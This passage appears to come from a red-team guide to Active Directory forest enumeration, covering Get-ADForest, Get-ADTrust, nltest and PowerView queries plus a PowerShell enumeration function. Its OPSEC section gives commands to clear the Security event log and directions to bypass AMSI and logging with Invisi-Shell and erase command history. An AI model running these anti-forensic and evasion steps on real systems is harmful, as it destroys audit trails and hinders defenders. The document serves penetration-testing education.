**Command Explanations:**
- **`Get-ADForest`**: Retrieves basic forest information for the current domain
- **`Get-ADForest -Identity cybercorp.local`**: Gets forest information for a specific forest
- **`Get-ADForest -Current LocalComputer`**: Gets forest information for the local computer
- **`Get-ADForest -Properties *`**: Retrieves all forest properties for comprehensive analysis
- **`Get-ADForest -Properties Name, ForestMode, RootDomain, Domains, GlobalCatalogs`**: Retrieves specific forest properties
- **`Get-ADForest -Properties Sites, ApplicationPartitions, CrossForestReferences`**: Retrieves specific forest properties

#### **Forest Trust Enumeration Commands**
```powershell
# Forest trust discovery
Get-ADTrust -Filter *
Get-ADTrust -Filter "TrustType -eq 'Forest'"
Get-ADTrust -Filter "TrustType -eq 'External'"

# Trust properties and analysis
Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes
Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner
Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner, SelectiveAuthentication
```

**Command Explanations:**
- **`Get-ADTrust -Filter *`**: Discovers all trust relationships in the forest
- **`Get-ADTrust -Filter "TrustType -eq 'Forest'"`**: Finds forest trusts specifically
- **`Get-ADTrust -Filter "TrustType -eq 'External'"`**: Discovers external trust relationships
- **`Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes`**: Retrieves specific trust properties
- **`Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner`**: Retrieves specific trust properties
- **`Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner, SelectiveAuthentication`**: Retrieves specific trust properties

#### **Forest Domain Controller Commands**
```powershell
# Domain controller enumeration
Get-ADDomainController -Filter *
Get-ADDomainController -Filter "IsGlobalCatalog -eq $true"
Get-ADDomainController -Filter "Site -eq 'Default-First-Site-Name'"

# DC properties and roles
Get-ADDomainController -Filter * -Properties IsGlobalCatalog, Site, OperatingSystem
Get-ADDomainController -Filter * -Properties IsGlobalCatalog, Site, OperatingSystem, Domain
Get-ADDomainController -Filter * -Properties IsGlobalCatalog, Site, OperatingSystem, Domain, Forest
```

**Command Explanations:**
- **`Get-ADDomainController -Filter *`**: Lists all domain controllers in the forest
- **`Get-ADDomainController -Filter "IsGlobalCatalog -eq $true"`**: Finds global catalog servers
- **`Get-ADDomainController -Filter "Site -eq 'Default-First-Site-Name'"`**: Discovers DCs in specific sites
- **`Get-ADDomainController -Filter * -Properties IsGlobalCatalog, Site, OperatingSystem`**: Retrieves specific DC properties
- **`Get-ADDomainController -Filter * -Properties IsGlobalCatalog, Site, OperatingSystem, Domain`**: Retrieves specific DC properties
- **`Get-ADDomainController -Filter * -Properties IsGlobalCatalog, Site, OperatingSystem, Domain, Forest`**: Retrieves specific DC properties

### **2. Native Windows Forest Commands (nltest)**

#### **Native Forest Enumeration Commands**
```cmd
# Forest domain controller discovery
nltest /dsgetdc:cybercorp.local
nltest /dsgetdc:cybercorp.local /gc
nltest /dsgetdc:cybercorp.local /kdc

# Forest trust enumeration
nltest /domain_trusts
nltest /domain_trusts /all_trusts
nltest /domain_trusts /v

# Forest domain enumeration
nltest /dclist:cybercorp.local
nltest /dclist:cybercorp.local /gc
nltest /dclist:cybercorp.local /kdc
```

**Command Explanations:**
- **`nltest /dsgetdc:cybercorp.local`**: Discovers domain controllers for a specific domain
- **`nltest /dsgetdc:cybercorp.local /gc`**: Specifically targets global catalog servers
- **`nltest /dsgetdc:cybercorp.local /kdc`**: Specifically targets Kerberos Key Distribution Center
- **`nltest /domain_trusts`**: Lists all domain trusts in the forest
- **`nltest /domain_trusts /all_trusts`**: Lists all domain trusts in the forest
- **`nltest /domain_trusts /v`**: Verbose output for domain trusts
- **`nltest /dclist:cybercorp.local`**: Enumerates domain controllers in a specific domain
- **`nltest /dclist:cybercorp.local /gc`**: Enumerates global catalog servers in a specific domain
- **`nltest /dclist:cybercorp.local /kdc`**: Enumerates Kerberos Key Distribution Center in a specific domain

#### **Advanced nltest Commands**
```cmd
# Forest site discovery
nltest /dsgetdc:cybercorp.local /site:Default-First-Site-Name
nltest /dsgetdc:cybercorp.local /site:Default-First-Site-Name /gc
nltest /dsgetdc:cybercorp.local /site:Default-First-Site-Name /kdc

# Forest replication testing
nltest /dsgetdc:cybercorp.local /replica
nltest /dsgetdc:cybercorp.local /replica /gc
nltest /dsgetdc:cybercorp.local /replica /kdc
```

**Command Explanations:**
- **`nltest /dsgetdc:cybercorp.local /site:Default-First-Site-Name`**: Finds DCs in a specific site
- **`nltest /dsgetdc:cybercorp.local /site:Default-First-Site-Name /gc`**: Finds GC in a specific site
- **`nltest /dsgetdc:cybercorp.local /site:Default-First-Site-Name /kdc`**: Finds KDC in a specific site
- **`nltest /dsgetdc:cybercorp.local /replica`**: Tests replication capabilities of DCs
- **`nltest /dsgetdc:cybercorp.local /replica /gc`**: Tests GC replication
- **`nltest /dsgetdc:cybercorp.local /replica /kdc`**: Tests KDC replication

### **3. PowerView/SharpView Forest Commands**

#### **PowerView Forest Enumeration Commands**
```powershell
# Basic PowerView forest commands
Get-Forest -Forest cybercorp.local
Get-ForestDomain -Forest cybercorp.local
Get-ForestGlobalCatalog -Forest cybercorp.local

# Enhanced forest information
Get-Forest -Forest cybercorp.local -Properties *
Get-ForestDomain -Forest cybercorp.local -Properties *
Get-ForestGlobalCatalog -Forest cybercorp.local -Properties *
```

**Command Explanations:**
- **`Get-Forest -Forest cybercorp.local`**: PowerView-based forest enumeration
- **`Get-ForestDomain -Forest cybercorp.local`**: Discovers domains within the forest
- **`Get-ForestGlobalCatalog -Forest cybercorp.local`**: Enumerates global catalog servers
- **`Get-Forest -Forest cybercorp.local -Properties *`**: Retrieves all properties for a specific forest
- **`Get-ForestDomain -Forest cybercorp.local -Properties *`**: Retrieves all properties for a specific domain
- **`Get-ForestGlobalCatalog -Forest cybercorp.local -Properties *`**: Retrieves all properties for a specific global catalog

#### **PowerView Trust Enumeration Commands**
```powershell
# PowerView trust discovery
Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes
Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner
Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner, SelectiveAuthentication

# Trust filtering and analysis
Get-DomainTrust -Properties * | Where-Object { $_.TrustType -eq "Forest" }
Get-DomainTrust -Properties * | Where-Object { $_.TrustType -eq "External" }
Get-DomainTrust -Properties * | Where-Object { $_.TrustDirection -eq "Bidirectional" }
```

**Command Explanations:**
- **`Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes`**: Retrieves specific trust properties
- **`Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner`**: Retrieves specific trust properties
- **`Get-DomainTrust -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner, SelectiveAuthentication`**: Retrieves specific trust properties
- **`Get-DomainTrust -Properties * | Where-Object { $_.TrustType -eq "Forest" }`**: Filters for forest trusts specifically
- **`Get-DomainTrust -Properties * | Where-Object { $_.TrustType -eq "External" }`**: Filters for external trusts specifically
- **`Get-DomainTrust -Properties * | Where-Object { $_.TrustDirection -eq "Bidirectional" }`**: Finds bidirectional trust relationships

#### **PowerView Domain Controller Commands**
```powershell
# PowerView DC enumeration
Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem
Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem, Domain
Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem, Domain, Forest

# DC filtering and analysis
Get-DomainController -Properties * | Where-Object { $_.IsGlobalCatalog -eq $true }
Get-DomainController -Properties * | Where-Object { $_.Site -eq "Default-First-Site-Name" }
Get-DomainController -Properties * | Where-Object { $_.OperatingSystem -like "*Windows Server*" }
```

**Command Explanations:**
- **`Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem`**: Retrieves specific DC properties
- **`Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem, Domain`**: Retrieves specific DC properties
- **`Get-DomainController -Properties IsGlobalCatalog, Site, OperatingSystem, Domain, Forest`**: Retrieves specific DC properties
- **`Get-DomainController -Properties * | Where-Object { $_.IsGlobalCatalog -eq $true }`**: Filters for global catalog servers
- **`Get-DomainController -Properties * | Where-Object { $_.Site -eq "Default-First-Site-Name" }`**: Finds DCs in specific sites
- **`Get-DomainController -Properties * | Where-Object { $_.OperatingSystem -like "*Windows Server*" }`**: Finds DCs with specific OS

### **4. Advanced Forest Enumeration Commands**

#### **Forest Schema Analysis Commands**
```powershell
# Forest schema enumeration
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=classSchema" -Properties *
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=attributeSchema" -Properties *

# Schema version analysis
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=classSchema" -Properties objectVersion
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=attributeSchema" -Properties objectVersion
```

**Command Explanations:**
- **`Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName"`**: Enumerates forest schema objects
- **`Get-ADObject -Filter "objectClass=classSchema"`**: Discovers schema classes
- **`Get-ADObject -Filter "objectClass=attributeSchema"`**: Discovers schema attributes
- **`Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=classSchema" -Properties objectVersion`**: Retrieves specific schema class properties
- **`Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=attributeSchema" -Properties objectVersion`**: Retrieves specific schema attribute properties

#### **Forest Configuration Commands**
```powershell
# Forest configuration enumeration
Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=*" -Properties *
Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=site" -Properties *
Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=subnet" -Properties *

# Application partitions
Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=applicationVersion" -Properties *
Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=applicationEntity" -Properties *
```

**Command Explanations:**
- **`Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName"`**: Enumerates forest configuration objects
- **`Get-ADObject -Filter "objectClass=site"`**: Discovers forest sites
- **`Get-ADObject -Filter "objectClass=subnet"`**: Discovers forest subnets
- **`Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=applicationVersion" -Properties *`**: Retrieves specific application partition properties
- **`Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=applicationEntity" -Properties *`**: Retrieves specific application entity properties

#### **Forest-Wide Object Commands**
```powershell
# Forest-wide object discovery
Get-ADObject -Filter "objectClass=*" -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Properties *
Get-ADObject -Filter "objectClass=*" -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Properties *

# Cross-forest references
Get-ADObject -Filter "objectClass=crossRef" -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Properties *
Get-ADObject -Filter "objectClass=crossRefContainer" -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Properties *
```

**Command Explanations:**
- **`Get-ADObject -Filter "objectClass=*" -SearchBase "CN=Configuration"`**: Discovers all configuration objects
- **`Get-ADObject -Filter "objectClass=crossRef"`**: Finds cross-forest references
- **`Get-ADObject -Filter "objectClass=crossRefContainer"`**: Discovers cross-reference containers

### **5. Red Team Forest Enumeration Tools**

#### **Custom Forest Enumeration Scripts**
```powershell
# Comprehensive forest enumeration function
function Invoke-ComprehensiveForestEnumeration {
    param([string]$ForestName = "cybercorp.local")
    
    try {
        Write-Host "Comprehensive Forest Enumeration for $ForestName" -ForegroundColor Green
        Write-Host "=" * 70
        
        $forestResults = @{
            ForestInfo = $null
            Domains = @()
            Trusts = @()
            GlobalCatalogs = @()
            Schema = @{}
            Configuration = @{}
        }
        
        # Forest Information
        Write-Host "Getting forest information..." -ForegroundColor Yellow
        try {
            $forest = Get-ADForest -Identity $ForestName
            $forestResults.ForestInfo = @{
                Name = $forest.Name
                ForestMode = $forest.ForestMode
                RootDomain = $forest.RootDomain
                Domains = $forest.Domains
                GlobalCatalogs = $forest.GlobalCatalogs
                Sites = $forest.Sites
                ApplicationPartitions = $forest.ApplicationPartitions
                CrossForestReferences = $forest.CrossForestReferences
                SPNSuffixes = $forest.SPNSuffixes
                UPNSuffixes = $forest.UPNSuffixes
            }
            
            Write-Host "Forest Information:" -ForegroundColor Green
            Write-Host "  Name: $($forest.Name)"
            Write-Host "  Forest Mode: $($forest.ForestMode)"
            Write-Host "  Root Domain: $($forest.RootDomain)"
            Write-Host "  Domains: $($forest.Domains.Count)"
            Write-Host "  Global Catalogs: $($forest.GlobalCatalogs.Count)"
            Write-Host "  Sites: $($forest.Sites.Count)"
            Write-Host "  Application Partitions: $($forest.ApplicationPartitions.Count)"
            Write-Host "  Cross-Forest References: $($forest.CrossForestReferences.Count)"
            Write-Host "  SPN Suffixes: $($forest.SPNSuffixes.Count)"
            Write-Host "  UPN Suffixes: $($forest.UPNSuffixes.Count)"
        }
        catch {
            Write-Warning "Failed to get forest information: $($_.Exception.Message)"
        }
        
        # Domain Enumeration
        Write-Host "`nEnumerating domains..." -ForegroundColor Yellow
        try {
            foreach ($domain in $forestResults.ForestInfo.Domains) {
                $domainInfo = Get-ADDomain -Identity $domain
                $forestResults.Domains += @{
                    Name = $domainInfo.Name
                    NetBIOSName = $domainInfo.NetBIOSName
                    DomainMode = $domainInfo.DomainMode
                    ParentDomain = $domainInfo.ParentDomain
                    ChildDomains = $domainInfo.ChildDomains
                }
                Write-Host "  Domain: $($domainInfo.Name) (NetBIOS: $($domainInfo.NetBIOSName))" -ForegroundColor Green
            }
        }
        catch {
            Write-Warning "Failed to enumerate domains: $($_.Exception.Message)"
        }
        
        # Trust Enumeration
        Write-Host "`nEnumerating trusts..." -ForegroundColor Yellow
        try {
            $trusts = Get-ADTrust -Filter * -Properties TrustType, TrustDirection, TrustAttributes, TrustPartner
            foreach ($trust in $trusts) {
                $forestResults.Trusts += @{
                    Name = $trust.Name
                    TrustType = $trust.TrustType
                    TrustDirection = $trust.TrustDirection
                    TrustAttributes = $trust.TrustAttributes
                    TrustPartner = $trust.TrustPartner
                }
                Write-Host "  Trust: $($trust.Name) ($($trust.TrustType) - $($trust.TrustDirection))" -ForegroundColor Green
            }
        }
        catch {
            Write-Warning "Failed to enumerate trusts: $($_.Exception.Message)"
        }
        
        # Global Catalog Enumeration
        Write-Host "`nEnumerating global catalogs..." -ForegroundColor Yellow
        try {
            $gcs = Get-ADDomainController -Filter "IsGlobalCatalog -eq $true" -Properties Site, OperatingSystem, Domain
            foreach ($gc in $gcs) {
                $forestResults.GlobalCatalogs += @{
                    Name = $gc.Name
                    Site = $gc.Site
                    OperatingSystem = $gc.OperatingSystem
                    Domain = $gc.Domain
                }
                Write-Host "  GC: $($gc.Name) (Site: $($gc.Site), Domain: $($gc.Domain))" -ForegroundColor Green
            }
        }
        catch {
            Write-Warning "Failed to enumerate global catalogs: $($_.Exception.Message)"
        }
        
        # Schema Enumeration
        Write-Host "`nEnumerating schema..." -ForegroundColor Yellow
        try {
            $schemaClasses = Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=classSchema" -Properties objectVersion | Select-Object -First 10
            $forestResults.Schema.Classes = $schemaClasses.Count
            Write-Host "  Schema Classes: $($schemaClasses.Count) (showing first 10)"
            
            $schemaAttributes = Get-ADObject -SearchBase "CN=Schema,CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=attributeSchema" -Properties objectVersion | Select-Object -First 10
            $forestResults.Schema.Attributes = $schemaAttributes.Count
            Write-Host "  Schema Attributes: $($schemaAttributes.Count) (showing first 10)"
        }
        catch {
            Write-Warning "Failed to enumerate schema: $($_.Exception.Message)"
        }
        
        # Configuration Enumeration
        Write-Host "`nEnumerating configuration..." -ForegroundColor Yellow
        try {
            $sites = Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=site" -Properties name
            $forestResults.Configuration.Sites = $sites.Count
            Write-Host "  Sites: $($sites.Count)"
            
            $subnets = Get-ADObject -SearchBase "CN=Configuration,$(Get-ADDomain).DistinguishedName" -Filter "objectClass=subnet" -Properties name
            $forestResults.Configuration.Subnets = $subnets.Count
            Write-Host "  Subnets: $($subnets.Count)"
        }
        catch {
            Write-Warning "Failed to enumerate configuration: $($_.Exception.Message)"
        }
        
        # Display summary
        Write-Host "`nForest Enumeration Summary:" -ForegroundColor Green
        Write-Host "  Domains: $($forestResults.Domains.Count)"
        Write-Host "  Trusts: $($forestResults.Trusts.Count)"
        Write-Host "  Global Catalogs: $($forestResults.GlobalCatalogs.Count)"
        Write-Host "  Schema Classes: $($forestResults.Schema.Classes)"
        Write-Host "  Schema Attributes: $($forestResults.Schema.Attributes)"
        Write-Host "  Sites: $($forestResults.Configuration.Sites)"
        Write-Host "  Subnets: $($forestResults.Configuration.Subnets)"
        
        Write-Host "`nForest Enumeration Complete!" -ForegroundColor Green
        return $forestResults
        
    }
    catch {
        Write-Warning "Forest enumeration failed: $($_.Exception.Message)"
        return $null
    }
}

# Execute comprehensive forest enumeration
$forestResults = Invoke-ComprehensiveForestEnumeration -ForestName "cybercorp.local"
```

**Command Explanations:**
- **`Invoke-ComprehensiveForestEnumeration`**: Comprehensive forest enumeration function
- **Forest information**: Retrieves basic forest details and structure
- **Domain enumeration**: Discovers all domains within the forest
- **Trust enumeration**: Analyzes trust relationships
- **Global catalog discovery**: Finds all GC servers
- **Schema analysis**: Enumerates forest schema objects
- **Configuration analysis**: Discovers forest-wide configuration

---

## 👥 **PERSONAS: FOREST ENUMERATION TESTING ROLES**

### **🔍 Enterprise Architecture Analyst**
- **Focus**: Forest structure mapping, domain hierarchy analysis, trust relationship discovery
- **Tools**: Get-ADForest, Get-ADTrust, PowerView forest functions
- **Output**: Forest architecture diagrams, trust maps, domain relationships
- **Timeline**: 2-4 hours for comprehensive forest analysis

### **⚔️ Trust Relationship Assessor**
- **Focus**: Trust enumeration, trust type analysis, cross-forest attack planning
- **Tools**: Get-ADTrust, Get-DomainTrust, nltest commands
- **Output**: Trust relationship matrix, attack path mapping, privilege escalation vectors
- **Timeline**: 1-3 hours for trust analysis

### **🚀 Global Catalog Strategist**
- **Focus**: GC server discovery, site-based GC placement, forest-wide object enumeration
- **Tools**: Get-ADDomainController, Get-ForestGlobalCatalog, site analysis
- **Output**: GC placement strategy, site optimization, forest-wide object discovery
- **Timeline**: 1-2 hours for GC analysis

### **🛡️ Schema & Configuration Analyst**
- **Focus**: Forest schema analysis, configuration enumeration, application partitions
- **Tools**: Get-ADObject, schema queries, configuration analysis
- **Output**: Schema version analysis, configuration objects, forest-wide settings
- **Timeline**: 1-2 hours for schema analysis

---

## 🎨 **VISUAL MASTERY: FOREST ENUMERATION ARCHITECTURE**

### **Forest Trust Relationship Map**

```mermaid
flowchart TD
    subgraph "🌳 Forest: cybercorp.local"
        A[🏛️ Root Domain<br/>cybercorp.local<br/>Forest Mode: WindowsThreshold] --> B[🏢 Child Domain<br/>us.corp.local<br/>Domain Mode: WindowsThreshold]
        A --> C[🏢 Child Domain<br/>eu.corp.local<br/>Domain Mode: WindowsThreshold]
        A --> D[🏢 Child Domain<br/>asia.corp.local<br/>Domain Mode: WindowsThreshold]
    end
    
    subgraph "🔗 Trust Relationships"
        A -. "Forest Trust<br/>Bidirectional" .-> E[🌐 External Domain<br/>techventures.com<br/>Trust Type: External]
        A -. "Forest Trust<br/>Bidirectional" .-> F[🌐 External Domain<br/>partners.local<br/>Trust Type: External]
        B -. "Parent-Child<br/>Transitive" .-> G[🏢 Sub-Domain<br/>ny.us.corp.local]
        C -. "Parent-Child<br/>Transitive" .-> H[🏢 Sub-Domain<br/>london.eu.corp.local]
    end
    
    subgraph "🌍 Global Catalogs"
        I[🖥️ GC: dc01.cybercorp.local<br/>Site: HQ] --> A
        J[🖥️ GC: dc02.us.corp.local<br/>Site: US-East] --> B
        K[🖥️ GC: dc03.eu.corp.local<br/>Site: EU-West] --> C
        L[🖥️ GC: dc04.asia.corp.local<br/>Site: Asia-Pacific] --> D
    end
    
    %% Styling
    classDef root fill:#e3f2fd,stroke:#1565c0,stroke-width:3px
    classDef child fill:#e8f5e8,stroke:#388e3c,stroke-width:2px
    classDef external fill:#ffebee,stroke:#d32f2f,stroke-width:2px
    classDef gc fill:#fff3e0,stroke:#f57c00,stroke-width:2px
    
    class A root
    class B,C,D child
    class E,F external
    class I,J,K,L gc
```


### **Forest Enumeration Workflow**

```mermaid
mindmap
  root((Forest Enumeration))
    🔍 Discovery Phase
      Forest Information
        Get-ADForest
        Forest mode analysis
        Root domain identification
      Domain Hierarchy
        Get-ADDomain
        Parent-child relationships
        Domain mode analysis
      Trust Relationships
        Get-ADTrust
        Trust type classification
        Trust direction analysis
    ⚔️ Analysis Phase
      Global Catalog Discovery
        Get-ADDomainController
        GC placement analysis
        Site-based optimization
      Schema Enumeration
        Schema version analysis
        Class enumeration
        Attribute discovery
      Configuration Analysis
        Site enumeration
        Subnet discovery
        Application partitions
    🚀 Exploitation Phase
      Cross-Domain Attacks
        Trust abuse techniques
        Inter-realm authentication
        Privilege escalation
      Forest-Wide Enumeration
        Cross-domain object discovery
        Forest-wide permissions
        Attack path mapping
    🛡️ OPSEC Phase
      Stealth Operations
        Invisi-Shell integration
        Timing controls
        Detection avoidance
      Cleanup Procedures
        Variable removal
        Log cleanup
        Evidence removal
```


---

## 🧪 **LAB vs PRODUCTION EXECUTION PROFILES**

### **🧪 LAB ENVIRONMENT**
- **Timing**: No restrictions, immediate execution
- **Scope**: Full forest enumeration, comprehensive trust analysis, verbose output
- **Tools**: All tools available, no stealth requirements
- **Logging**: Minimal concern, focus on learning
- **Risk**: Low, controlled environment

### **🏢 PRODUCTION ENVIRONMENT**
- **Timing**: 3-6 second jitter between queries, gradual escalation
- **Scope**: Targeted enumeration, minimal footprint, stealth-first approach
- **Tools**: Invisi-Shell mandatory, selective tooling
- **Logging**: Maximum stealth, minimal footprint
- **Risk**: High, detection consequences

### **⚡ BALANCED APPROACH**
- **Timing**: 1-2 second jitter, moderate pace
- **Scope**: Strategic enumeration, vulnerability-focused
- **Tools**: Invisi-Shell + selective tooling
- **Logging**: Moderate stealth, controlled visibility
- **Risk**: Medium, balanced approach

---

## 🔒 **DETECTION/OPSEC & CLEANUP**

### **🔒 STEALTH REQUIREMENTS**
> **⚠️ CRITICAL**: **Invisi-Shell** must be loaded before any forest enumeration testing in production environments to bypass logging and AMSI detection.

#### **OPSEC Best Practices**
- **Timing Control**: Use 3-6 second jitter between forest queries
- **Scope Limitation**: Focus on specific forest components
- **Tool Selection**: Use Microsoft-signed tools when possible
- **Query Volume**: Limit concurrent forest enumeration
- **Response Analysis**: Monitor for detection indicators

#### **Detection Avoidance**
- **Event Logging**: Minimize forest enumeration events
- **Network Monitoring**: Blend with normal AD activity
- **Query Patterns**: Use standard forest queries to avoid detection
- **Tool Signatures**: Use native tools to avoid detection
- **Response Patterns**: Analyze responses for anomalies

### **🧹 Cleanup Procedures**

#### **Forest Enumeration Cleanup**
```powershell
# Remove forest enumeration artifacts
Remove-Variable forestResults -ErrorAction SilentlyContinue
Remove-Variable trustAnalysis -ErrorAction SilentlyContinue
Remove-Variable gcResults -ErrorAction SilentlyContinue

# Clear forest connection cache
Get-Process | Where-Object {$_.ProcessName -like "*ldp*"} | Stop-Process -Force -ErrorAction SilentlyContinue
```

#### **Log Cleanup**
```powershell
# Clear relevant event logs (requires elevation)
Clear-EventLog -LogName "Application" -Source "*AD*" -ErrorAction SilentlyContinue
Clear-EventLog -LogName "Security" -Source "Microsoft-Windows-Security-Auditing" -ErrorAction SilentlyContinue
```

#### **Evidence Removal**
- **Temporary Files**: Remove forest enumeration results and logs
- **Command History**: Clear PowerShell history
- **Registry Keys**: Remove any custom registry entries
- **Network Traces**: Clear network connection logs

---

## 🔗 **CROSS-REFERENCES & INTEGRATION**

### **📚 Related Enumeration Techniques**
- **[Domain Enumeration](./04_Domain_Enumeration.md)**: Individual domain analysis within forest
- **[Trust Enumeration](../02_Active_Directory_Components/07_Trusts.md)**: Detailed trust relationship analysis
- **[Global Catalog Enumeration](../02_Active_Directory_Components/12_Global_Catalog.md)**: GC server discovery and analysis
- **[Schema Enumeration](../02_Active_Directory_Components/11_Schema.md)**: Forest schema analysis and versioning
- **[Site Enumeration](../02_Active_Directory_Components/06_Sites_and_Subnets.md)**: Forest site and subnet discovery

### **🛠️ Tool Integration**
- **[Tool Setup & Loading](./01_Tool_Setup_Loading.md)**: Invisi-Shell, PowerView setup
- **[PowerShell Remoting](./19_PowerShell_Remoting_Enumeration.md)**: Remote forest enumeration
- **[WMI Enumeration](./20_WMI_Enumeration.md)**: Forest service enumeration
- **[Registry Enumeration](./18_Registry_Enumeration.md)**: Forest configuration analysis

### **🎯 Attack Path Integration**
- **[Kerberos Advanced Attacks](./26_Kerberos_Advanced_Attacks.md)**: Cross-forest Kerberos attacks
- **[Trust Abuse](../02_Active_Directory_Components/07_Trusts.md)**: Trust-based privilege escalation
- **[BloodHound Integration](./10_BloodHound_Enumeration.md)**: Forest-wide attack path mapping
- **[Cross-Domain Enumeration](./04_Domain_Enumeration.md)**: Multi-domain object discovery

### **🛡️ Detection & Defense**
- **[Blue Team Detection](./32_Detection_Blue_Team.md)**: Forest enumeration monitoring and alerting
- **[Red Team OPSEC](./33_Detection_Red_Team.md)**: Stealth techniques and evasion
- ****Remediation Planning (removed)****: Forest security hardening

---
